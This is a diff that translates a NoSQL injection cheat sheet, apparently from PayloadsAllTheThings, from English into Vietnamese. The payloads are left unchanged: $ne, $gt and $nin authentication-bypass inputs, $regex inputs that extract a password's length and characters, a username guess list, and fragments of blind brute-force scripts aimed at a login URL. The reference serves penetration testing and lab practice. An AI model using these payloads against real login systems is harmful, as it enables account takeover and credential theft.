@@ -1,62 +1,64 @@
 # NoSQL Injection
 
-> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
+> Cơ sở dữ liệu NoSQL cung cấp các ràng buộc về tính nhất quán lỏng lẻo hơn so với cơ sở dữ liệu SQL truyền thống. Do yêu cầu ít ràng buộc quan hệ và kiểm tra tính nhất quán hơn, cơ sở dữ liệu NoSQL thường mang lại lợi ích về hiệu năng và khả năng mở rộng. Tuy nhiên, các cơ sở dữ liệu này vẫn có khả năng tồn tại lỗ hổng injection, ngay cả khi chúng không sử dụng cú pháp SQL truyền thống.
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [Operator Injection](#operator-injection)
-    * [Authentication Bypass](#authentication-bypass)
-    * [Extract Length Information](#extract-length-information)
-    * [Extract Data Information](#extract-data-information)
-    * [WAF and Filters](#waf-and-filters)
-* [Blind NoSQL](#blind-nosql)
-    * [POST with JSON Body](#post-with-json-body)
-    * [POST with urlencoded Body](#post-with-urlencoded-body)
-    * [GET](#get)
-* [Labs](#references)
-* [References](#references)
+* [Công cụ](#tools)
+* [Phương pháp](#methodology)
 
-## Tools
+  * [Operator Injection](#operator-injection)
+  * [Vượt qua xác thực](#authentication-bypass)
+  * [Trích xuất thông tin về độ dài](#extract-length-information)
+  * [Trích xuất thông tin dữ liệu](#extract-data-information)
+  * [WAF và bộ lọc](#waf-and-filters)
+* [NoSQL Blind](#blind-nosql)
 
-* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
-* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
-* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities.
+  * [POST với JSON Body](#post-with-json-body)
+  * [POST với urlencoded Body](#post-with-urlencoded-body)
+  * [GET](#get)
+* [Các bài lab](#references)
+* [Tài liệu tham khảo](#references)
 
-## Methodology
+## Công cụ
 
-NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.
+* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Công cụ tự động liệt kê cơ sở dữ liệu NoSQL và khai thác ứng dụng web
+* https://github.com/digininja/nosqlilab - Lab để thực hành NoSQL Injection
+* https://github.com/matrix/Burp-NoSQLiScanner - Extension cung cấp phương pháp phát hiện các lỗ hổng NoSQL injection.
+
+## Phương pháp
+
+NoSQL injection xảy ra khi kẻ tấn công thao túng các truy vấn bằng cách chèn input độc hại vào truy vấn cơ sở dữ liệu NoSQL. Không giống SQL injection, NoSQL injection thường khai thác các truy vấn dựa trên JSON và các operator như `$ne`, `$gt`, `$regex` hoặc `$where` trong MongoDB.
 
 ### Operator Injection
 
-| Operator | Description        |
-| -------- | ------------------ |
-| $ne      | not equal          |
-| $regex   | regular expression |
-| $gt      | greater than       |
-| $lt      | lower than         |
-| $nin     | not in             |
+| Operator | Mô tả               |
+| -------- | ------------------- |
+| $ne      | khác                |
+| $regex   | biểu thức chính quy |
+| $gt      | lớn hơn             |
+| $lt      | nhỏ hơn             |
+| $nin     | không nằm trong     |
 
-Example: A web application has a product search feature
+Ví dụ: Một ứng dụng web có chức năng tìm kiếm sản phẩm:
 
 ```js
 db.products.find({ "price": userInput })
 ```
 
-An attacker can inject a NoSQL query: `{ "$gt": 0 }`.
+Kẻ tấn công có thể inject một truy vấn NoSQL: `{ "$gt": 0 }`.
 
 ```js
 db.products.find({ "price": { "$gt": 0 } })
 ```
 
-Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.
+Thay vì chỉ trả về một sản phẩm cụ thể, cơ sở dữ liệu sẽ trả về tất cả sản phẩm có giá lớn hơn 0, dẫn đến rò rỉ dữ liệu.
 
-### Authentication Bypass
+### Vượt qua xác thực
 
-Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
+Vượt qua xác thực cơ bản bằng cách sử dụng `not equal` (`$ne`) hoặc `greater than` (`$gt`).
 
-* HTTP data
+* Dữ liệu HTTP
 
   ```ps1
   username[$ne]=toto&password[$ne]=toto
@@ -65,7 +67,7 @@ Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
   login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
   ```
 
-* JSON data
+* Dữ liệu JSON
 
   ```json
   {"username": {"$ne": null}, "password": {"$ne": null}}
@@ -74,20 +76,20 @@ Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
   {"username": {"$gt":""}, "password": {"$gt":""}}
   ```
 
-### Extract Length Information
+### Trích xuất thông tin về độ dài
 
-Inject a payload using the $regex operator. The injection will work when the length is correct.
+Inject payload bằng operator `$regex`. Injection sẽ hoạt động khi độ dài là chính xác.
 
 ```ps1
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-### Extract Data Information
+### Trích xuất thông tin dữ liệu
 
-Extract data with "`$regex`" query operator.
+Trích xuất dữ liệu bằng query operator `$regex`.
 
-* HTTP data
+* Dữ liệu HTTP
 
   ```ps1
   username[$ne]=toto&password[$regex]=m.{2}
@@ -98,7 +100,7 @@ Extract data with "`$regex`" query operator.
   username[$ne]=toto&password[$regex]=md.*
   ```
 
-* JSON data
+* Dữ liệu JSON
 
   ```json
   {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
@@ -106,27 +108,27 @@ Extract data with "`$regex`" query operator.
   {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
   ```
 
-Extract data with "`$in`" query operator.
+Trích xuất dữ liệu bằng query operator `$in`.
 
 ```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
 
-### WAF and Filters
+### WAF và bộ lọc
 
-**Remove pre-condition**:
+**Loại bỏ điều kiện tiên quyết:**
 
-In MongoDB, if a document contains duplicate keys, only the last occurrence of the key will take precedence.
+Trong MongoDB, nếu một document chứa các key trùng lặp, chỉ giá trị của key xuất hiện cuối cùng mới được ưu tiên.
 
 ```js
 {"id":"10", "id":"100"} 
 ```
 
-In this case, the final value of "id" will be "100".
+Trong trường hợp này, giá trị cuối cùng của `"id"` sẽ là `"100"`.
 
 ## Blind NoSQL
 
-### POST with JSON Body
+### POST với JSON Body
 
 Python script:
 
@@ -152,7 +154,7 @@ while True:
                 password += c
 ```
 
-### POST with urlencoded Body
+### POST với urlencoded Body
 
 Python script:
 
@@ -211,8 +213,8 @@ require 'httpx'
 username = 'admin'
 password = ''
 url = 'http://example.org/login'
-# CHARSET = (?!..?~).to_a # all ASCII printable characters
-CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
+# CHARSET = (?!..?~).to_a # tất cả các ký tự ASCII có thể in được
+CHARSET = [*'0'..'9',*'a'..'z','-'] # chữ và số + '-'
 GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
 session = HTTPX.plugin(:persistent)
 
@@ -230,12 +232,12 @@ while true
 end
 ```
 
-## Labs
+## Các bài lab
 
 * [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
 * [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)
 
-## References
+## Tài liệu tham khảo
 
 * [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
 * [Getting rid of pre- and post-conditions in NoSQL injections - Reino Mostert - March 11, 2025](https://web.archive.org/web/20260208131430/https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
